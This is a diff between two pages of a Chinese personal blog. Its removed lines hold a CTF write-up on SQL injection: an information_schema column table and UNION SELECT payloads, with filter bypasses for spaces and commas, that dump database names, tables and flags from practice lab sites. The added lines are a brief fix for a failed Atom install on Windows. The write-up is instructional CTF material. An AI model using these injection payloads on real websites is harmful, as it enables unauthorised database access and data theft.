@@ -14,18 +14,20 @@
 <meta name="author" content="梦在远方" />
 
 
-<meta name="description" content="sql注入的几种类型和实战操作，以及数据库通用库information_schema详细描述">
-<meta name="keywords" content="sql-injection">
+<meta name="description" content="atom.exe安装包打开失败">
+<meta name="keywords" content="atom">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql注入">
-<meta property="og:url" content="www.cesarz.com.cn/2018/08-13-sql-injection.html">
+<meta property="og:title" content="windows 安装 Atom 失败，出现update已停止工作">
+<meta property="og:url" content="www.cesarz.com.cn/2019/08-18-atom-error-resolve.html">
 <meta property="og:site_name" content="梦在远方">
-<meta property="og:description" content="sql注入的几种类型和实战操作，以及数据库通用库information_schema详细描述">
+<meta property="og:description" content="atom.exe安装包打开失败">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-06-10T09:19:44.927Z">
+<meta property="og:image" content="/article_img/atom-solution.png">
+<meta property="og:updated_time" content="2019-08-18T07:04:15.136Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sql注入">
-<meta name="twitter:description" content="sql注入的几种类型和实战操作，以及数据库通用库information_schema详细描述">
+<meta name="twitter:title" content="windows 安装 Atom 失败，出现update已停止工作">
+<meta name="twitter:description" content="atom.exe安装包打开失败">
+<meta name="twitter:image" content="/article_img/atom-solution.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +59,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>sql注入 | 梦在远方</title>
+<title>windows 安装 Atom 失败，出现update已停止工作 | 梦在远方</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 
@@ -364,11 +366,11 @@
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
 
-      <div class="body-wrap"><article id="post-sql-injection" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-atom-error-resolve" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/08-13-sql-injection.html" class="article-date">
-      <time datetime="2018-08-13T13:25:52.000Z" itemprop="datePublished">2018-08-13</time>
+      <a href="/2019/08-18-atom-error-resolve.html" class="article-date">
+      <time datetime="2019-08-18T06:53:36.000Z" itemprop="datePublished">2019-08-18</time>
 </a>
 
 
@@ -384,7 +386,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      sql注入
+      windows 安装 Atom 失败，出现update已停止工作
     </h1>
   
 
@@ -394,13 +396,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    <a class="article-category-link" href="/categories/problem-solution/">problem-solution</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql-injection/">sql-injection</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/atom/">atom</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -410,25 +412,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="一、information-schema库详细介绍"><a href="#一、information-schema库详细介绍" class="headerlink" title="一、information_schema库详细介绍"></a>一、information_schema库详细介绍</h1><blockquote>
-<p>information_schema.COLUMNS里存了所有数据库系统的库名和表名<br>TABLE_SCHEMA库名<br>TABLE_NAME表名<br>COLUMN_NAME列名</p>
-</blockquote>
-<p><table><tbody><tr><th>列名</th><th>数据类型</th><th>描述</th></tr><tr><td><strong>TABLE_CATALOG</strong></td><td><strong>nvarchar(128)</strong></td><td>表限定符。</td></tr><tr><td><span style="background-color:#ffff00;"><strong>TABLE_SCHEMA</strong></span></td><td><span style="background-color: #ffff00;"><strong>nvarchar(128)</strong></span></td><td width="41%"><span style="background-color: #ffff00;">表所有者。</span></td></tr><tr valign="top"><td><span style="background-color: #ffff00;"><strong>TABLE_NAME</strong></span></td><td width="23%"><span style="background-color: #ffff00;"><strong>nvarchar(128)</strong></span></td><td width="41%"><span style="background-color: #ffff00;">表名。</span></td></tr><tr valign="top"><td width="36%"><span style="background-color: #ffff00;"><strong>COLUMN_NAME</strong></span></td><td width="23%"><span style="background-color: #ffff00;"><strong>nvarchar(128)</strong></span></td><td width="41%"><span style="background-color: #ffff00;">列名。</span></td></tr><tr valign="top"><td width="36%"><strong>ORDINAL_POSITION</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%">列标识号。</td></tr><tr valign="top"><td width="36%"><strong>COLUMN_DEFAULT</strong></td><td width="23%"><strong>nvarchar(4000)</strong></td><td width="41%">列的默认值。</td></tr><tr valign="top"><td width="36%"><strong>IS_NULLABLE</strong></td><td width="23%"><strong>varchar(3)</strong></td><td width="41%">列的为空性。如果列允许 NULL，那么该列返回 YES。否则，返回 NO。</td></tr><tr valign="top"><td width="36%"><strong>DATA_TYPE</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">系统提供的数据类型。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_MAXIMUM_LENGTH</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%">以字符为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_OCTET_LENGTH</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%">以字节为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>NUMERIC_PRECISION</strong></td><td width="23%"><strong>tinyint</strong></td><td width="41%">近似数字数据、精确数字数据、整型数据或货币数据的精度。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>NUMERIC_PRECISION_RADIX</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%">近似数字数据、精确数字数据、整型数据或货币数据的精度基数。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>NUMERIC_SCALE</strong></td><td width="23%"><strong>tinyint</strong></td><td width="41%">近似数字数据、精确数字数据、整数数据或货币数据的小数位数。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>DATETIME_PRECISION</strong></td><td width="23%"><strong>smallint</strong></td><td width="41%"><strong>datetime</strong> 及 SQL-92<strong> interval </strong>数据类型的子类型代码。对于其它数据类型，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_SET_CATALOG</strong></td><td width="23%"><strong>varchar(6)</strong></td><td width="41%">如果列是字符数据或 <strong>text</strong> 数据类型，那么返回 <strong>master</strong>，指明字符集所在的数据库。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_SET_SCHEMA</strong></td><td width="23%"><strong>varchar(3)</strong></td><td width="41%">如果列是字符数据或 <strong>text </strong>数据类型，那么返回 <strong>DBO</strong>，指明字符集的所有者名称。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>CHARACTER_SET_NAME</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">如果该列是字符数据或 <strong>text</strong> 数据类型，那么为字符集返回唯一的名称。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>COLLATION_CATALOG</strong></td><td width="23%"><strong>varchar(6)</strong></td><td width="41%">如果列是字符数据或 <strong>text </strong>数据类型，那么返回 <strong>master</strong>，指明在其中定义排序次序的数据库。否则此列为 NULL。</td></tr><tr valign="top"><td width="36%"><strong>COLLATION_SCHEMA</strong></td><td width="23%"><strong>varchar(3)</strong></td><td width="41%">返回 <strong>DBO</strong>，为字符数据或 <strong>text </strong>数据类型指明排序次序的所有者。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>COLLATION_NAME</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">如果列是字符数据或 <strong>text</strong> 数据类型，那么为排序次序返回唯一的名称。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>DOMAIN_CATALOG</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">如果列是一种用户定义数据类型，那么该列是某个数据库名称，在该数据库名中创建了这种用户定义数据类型。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>DOMAIN_SCHEMA</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%">如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 NULL。</td></tr><tr valign="top"><td width="36%"><strong>DOMAIN_NAME</strong></td><td width="23%"><strong>nvarchar(128)</strong></td><td width="41%"><p>如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL。</p></td></tr></tbody></table></p>
-<p><hr></p>
-<h1 id="sql注入-空格过滤"><a href="#sql注入-空格过滤" class="headerlink" title="sql注入(空格过滤)"></a>sql注入(空格过滤)</h1><p>以过滤空格实验为例子（空格可以用/**/替换）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/web/index_2.php?</span><br></pre></td></tr></table></figure></p>
-<p>1.二分爆显示位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;order/**/by/**/1#</span><br></pre></td></tr></table></figure></p>
-<p>大于1的时候报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unknown column &apos;2&apos; in &apos;order clause&apos;</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为1的时候无显示正确，即当前只有一个显示位</span><br></pre></td></tr></table></figure>
-<p>2.爆所有的数据库，显示在第一行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4&apos;union/**/select/**/mid(group_concat(distinct/**/table_schema),1,100)/**/from/**/information_schema.columns#</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID: 4&apos;union/**/select/**/mid(group_concat(distinct/**/table_schema),1,100)/**/from/**/information_schema.columns#</span><br><span class="line">name: information_schema,test,web1</span><br></pre></td></tr></table></figure>
-<p>3.爆web1的所有表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union/**/select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&apos;web1&apos;#</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID: &apos;union/**/select/**/group_concat(distinct/**/table_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&apos;web1&apos;#</span><br><span class="line">name: flag,web_1</span><br></pre></td></tr></table></figure>
-<p>4.爆数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4&apos;union/**/select/**/flag/**/from/**/web1.flag#</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID: 4&apos;union/**/select/**/flag/**/from/**/web1.flag#</span><br><span class="line">name: flag&#123;Y0u_@r3_5O_dAmn_90Od&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="sql注入-不用逗号"><a href="#sql注入-不用逗号" class="headerlink" title="sql注入(不用逗号)"></a>sql注入(不用逗号)</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a0e139e4e386402daac82ca824f96de2840a49a8d1e54121.game.ichunqiu.com/l0gin.php?id=<span class="string">' union select * from (select group_concat(distinct(table_schema)) from information_schema.tables ) a join (select version() ) b %23</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d=&apos; union select * from (select group_concat(table_name ) from information_schema.tables where table_schema = &apos;sqli&apos; ) a join (select version() ) b %23</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = &apos; union select * from (select group_concat(column_name ) from information_schema.columns where table_name = &apos;users&apos; ) a join (select version() ) b %23</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&apos; union select * from (select group_concat(flag_9c861b688330 ) from users ) a join (select version() ) b %23</span><br></pre></td></tr></table></figure>
+        <p>我是在最近重装系统后，安装atom时使用.exe安装失败，出现如下错误：</p>
+<p><div align="center"><img src="/article_img/atom-solution.png" alt="&quot;atom-solution&quot;"></div><br>最后通过换安装方式解决的：我使用的是atom-windows.zip<br>安装包地址如下:<br><a href="https://github.com/atom/atom/releases/tag/v1.40.0" target="_blank" rel="noopener">https://github.com/atom/atom/releases/tag/v1.40.0</a></p>
 
       
     </div>
@@ -437,13 +422,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/08-13-sql-injection.html">sql注入</a></p>
+        <p><span>本文标题:</span><a href="/2019/08-18-atom-error-resolve.html">windows 安装 Atom 失败，出现update已停止工作</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">梦在远方</a></p>
-        <p><span>发布时间:</span>2018-08-13, 21:25:52</p>
-        <p><span>最后更新:</span>2019-06-10, 17:19:44</p>
+        <p><span>发布时间:</span>2019-08-18, 14:53:36</p>
+        <p><span>最后更新:</span>2019-08-18, 15:04:15</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/08-13-sql-injection.html" title="sql注入">www.cesarz.com.cn/2018/08-13-sql-injection.html</a>
-            <span class="copy-path" data-clipboard-text="原文: www.cesarz.com.cn/2018/08-13-sql-injection.html　　作者: 梦在远方" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/08-18-atom-error-resolve.html" title="windows 安装 Atom 失败，出现update已停止工作">www.cesarz.com.cn/2019/08-18-atom-error-resolve.html</a>
+            <span class="copy-path" data-clipboard-text="原文: www.cesarz.com.cn/2019/08-18-atom-error-resolve.html　　作者: 梦在远方" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -455,16 +440,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/08-14-sqlmap.html">
-                    sqlmap用户手册及实战
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/08-12-CTF.html">
-                    CTF简介
+                <a href="/2019/06-29-npm-error-resolve.html">
+                    npm ERR! Unexpected end of JSON input while parsing near和npm ERR! code EINTEGRITY
                 </a>
             </div>
         
@@ -476,7 +455,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一、information-schema库详细介绍"><span class="toc-number">1.</span> <span class="toc-text">一、information_schema库详细介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql注入-空格过滤"><span class="toc-number">2.</span> <span class="toc-text">sql注入(空格过滤)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql注入-不用逗号"><span class="toc-number">3.</span> <span class="toc-text">sql注入(不用逗号)</span></a></li></ol>
+            
         
     </div>
     <style>
@@ -512,7 +491,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"sql注入　| 梦在远方　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"windows 安装 Atom 失败，出现update已停止工作　| 梦在远方　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -530,15 +509,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/08-14-sqlmap.html" title="上一篇: sqlmap用户手册及实战">
-                <i class="fa icon-left-big"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa icon-home"></i></a>
         
 
         <a title="文章列表"><i class="fa icon-th-large"></i><i class="fa icon-right-big"></i></a>
 
         
-            <a href="/2018/08-12-CTF.html" title="下一篇: CTF简介">
+            <a href="/2019/06-29-npm-error-resolve.html" title="下一篇: npm ERR! Unexpected end of JSON input while parsing near和npm ERR! code EINTEGRITY">
                 <i class="fa icon-right-big"></i>
             </a>
         
@@ -580,8 +557,8 @@
   </style>
   <script type="text/javascript">
     var gitment = new Gitment({
-	  id: 'Mon Aug 13 2018 21:25:52 GMT+0800',
-	  title: 'sql注入',
+	  id: 'Sun Aug 18 2019 14:53:36 GMT+0800',
+	  title: 'windows 安装 Atom 失败，出现update已停止工作',
 	  owner: 'chenzihaoww',
 	  repo: 'chenzihaosay.github.io',
 	  oauth: {
